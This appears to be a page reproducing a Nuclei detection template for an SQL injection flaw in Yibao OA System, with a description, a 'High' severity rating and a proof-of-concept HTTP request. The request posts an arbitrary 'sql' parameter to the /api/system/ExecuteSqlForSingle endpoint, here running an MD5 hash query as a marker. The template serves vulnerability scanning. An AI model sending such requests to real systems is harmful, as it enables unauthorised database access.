# Nuclei Template: Yibao OA System - SQL Injection
**Template ID:** yibao-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**Source:** Nuclei Template (`yibao-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Yibao OA System is vulnerable to SQL Injection.

## Steps to reproduce / Exploit Payload
```http
POST /api/system/ExecuteSqlForSingle HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{num}}')),3,32)&strParameters
```

